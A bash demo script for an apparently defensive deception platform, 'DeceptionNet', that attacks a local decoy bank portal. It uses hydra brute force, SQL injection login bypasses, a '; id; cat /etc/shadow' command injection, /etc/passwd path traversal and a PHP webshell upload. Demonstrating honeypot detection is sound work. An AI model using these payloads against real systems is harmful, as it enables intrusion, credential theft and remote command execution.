#!/bin/bash
# DeceptionNet live-hack demo: an "attacker" tries to break into the
# Vertex Bank portal. Every step is trapped, MITRE-tagged, and shown live
# on the dashboard. Run inside the attacker container:
#   docker cp attacker/scripts/hack-demo.sh deciptionnet-attacker-1:/opt/attack/scripts/
#   docker compose exec attacker bash /opt/attack/scripts/hack-demo.sh
set -u
HOST="${TARGET_HOST:-attack-target}"
PORT="${TARGET_PORT:-9090}"
BASE="http://${HOST}:${PORT}"
JAR=/tmp/attacker-session.cookies
PASSLIST="/opt/attack/scripts/mini-pass.txt"
rm -f "$JAR"

echo "=============================================================="
echo " DeceptionNet live-hack demo"
echo " Target: $BASE  (Vertex Bank Employee Portal)"
echo "=============================================================="

echo
echo "[STAGE 1] Brute force — 'admin' + wordlist (hydra)"
hydra -l admin -P "$PASSLIST" "$HOST" http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" -s "$PORT" -t 4 2>/dev/null \
  || echo "  (hydra finished — T1110 attempts already logged)"

echo
echo "[STAGE 2] SQL injection login bypass (stateless, separate sessions)"
for payload in "admin'--" "' OR 1=1 --"; do
  echo "  -> $payload"
  curl -s -X POST "$BASE/login" --data-urlencode "username=$payload" --data-urlencode "password=x" >/dev/null
done

echo
echo "[STAGE 3] Focused attacker — cracked creds + post-exploit (ONE session)"
echo "  -> login with admin / s3cr3t! (pins session cookie)"
curl -s -c "$JAR" -X POST "$BASE/login" -d "username=admin&password=s3cr3t!" >/dev/null
echo "  -> command injection on /ping: ; id; cat /etc/shadow"
curl -s -b "$JAR" -X POST "$BASE/ping" --data-urlencode "host=127.0.0.1; id; cat /etc/shadow" >/dev/null
echo "  -> path traversal on /read: ../../../../etc/passwd"
curl -s -b "$JAR" "$BASE/read?file=../../../../etc/passwd" >/dev/null
echo "  -> webshell upload on /upload: shell.php"
echo '<?php system($_GET["c"]); ?>' > /tmp/shell.php
curl -s -b "$JAR" -F "file=@/tmp/shell.php" "$BASE/upload" >/dev/null

echo
echo "[+] Demo complete. Open the DeceptionNet dashboard (localhost:3000) —"
echo "    every step is now a MITRE-tagged attack session."